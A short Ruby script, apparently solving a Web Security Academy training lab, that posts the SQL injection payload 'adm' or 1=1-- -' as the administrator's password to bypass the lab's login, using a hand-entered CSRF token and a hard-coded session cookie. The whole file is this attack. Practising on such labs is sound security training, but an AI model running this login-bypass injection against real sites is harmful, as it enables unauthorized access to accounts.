# You need to manually provide the CSRF token

require 'http'
require 'nokogiri'

payload = "adm' or 1=1-- -"

puts "enter CSRF token: "
csrf = gets.chomp
username = 'administrator'
url = "https://0aae00f5047cd33680bc8fac00580094.web-security-academy.net/login"

# Preparing HTTP Client to get the CSRF token
client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "XUUoPQbWzlXwg7Zhx5i2GfCAfIwYrX8d"
	)
	
postcl = client.post url,:form => {

					:csrf=>"#{csrf}",
					:username=>"administrator",
					:password=>"#{payload}"

					}

puts postcl.headers.to_a
